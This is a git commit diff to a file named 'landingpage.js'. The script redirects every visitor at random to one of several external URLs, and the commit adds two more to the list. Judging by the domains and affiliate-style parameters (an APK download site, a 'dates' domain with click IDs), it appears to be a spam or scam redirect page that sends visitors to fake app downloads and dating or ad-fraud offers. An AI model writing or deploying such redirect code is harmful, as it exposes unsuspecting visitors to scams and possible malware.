6867a22db0002375e5e9dd3e3b14a88b8df811fb
insiala2f <84434303+insiala2f@users.noreply.github.com>
2023-01-26 07:16:14 -0700

    Update landingpage.js

--- landingpage.js
+++ landingpage.js
@@ -1,5 +1,7 @@
 var dataUrl = [
 'https://gets.fullapkz.com/app-live-and-chat-2023/',
+'https://fairlyleadingenquiry.com/yrz74x1194?key=0ad7527ad505e9570845350e9925d7bf',
+'https://lavgnn.paiatialdates.net?utm_source=da57dc555e50572d&s1=152357&s2=1760675&s3=Deargap&s5=Deargap&click_id=Deargap&j1=1',
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
